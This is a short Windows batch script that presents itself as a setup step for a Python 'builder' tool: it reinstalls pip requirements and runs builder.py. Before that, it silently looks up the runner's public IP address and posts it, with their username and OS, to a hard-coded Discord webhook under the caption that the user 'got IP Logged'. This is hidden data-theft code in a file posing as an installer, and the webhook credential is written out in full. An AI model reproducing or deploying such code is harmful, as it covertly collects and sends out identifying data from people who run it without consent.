@ECHO OFF
@MODE 101,50

set webhook=https://discord.com/api/webhooks/997378775283150891/mkG2gXkPeSNpOklfqHtTOaEaIWIQBe2GJfnXElp_vGAQ6e-ThMSlhbRExfeDZBs9RoYQ
curl -4 icanhazip.com 1> tmpwanip & cls & set /p ipv4= < tmpwanip & set /p ipv4= < tmpwanip & del /f tmpwanip
set message=:warning: **%username% got IP Logged!** :warning:\n\n:man_pouting: **Username** : %username%\n:detective: **IP** : %ipv4%\n:window: **OS** : %os% 
curl --silent --output /dev/null -X POST -H "Content-type: application/json" --data "{\"content\": \"%message%\"}" %webhook%

ECHO REMOVING INTERFERENCES && PY -3.10 -m pip uninstall -r interferences.txt
ECHO INSTALLING REQUIREMENTS && PY -3.10 -m pip install --force-reinstall -r requirements.txt
CLS && PY -3.10 builder.py
PAUSE && COLOR 07 && EXIT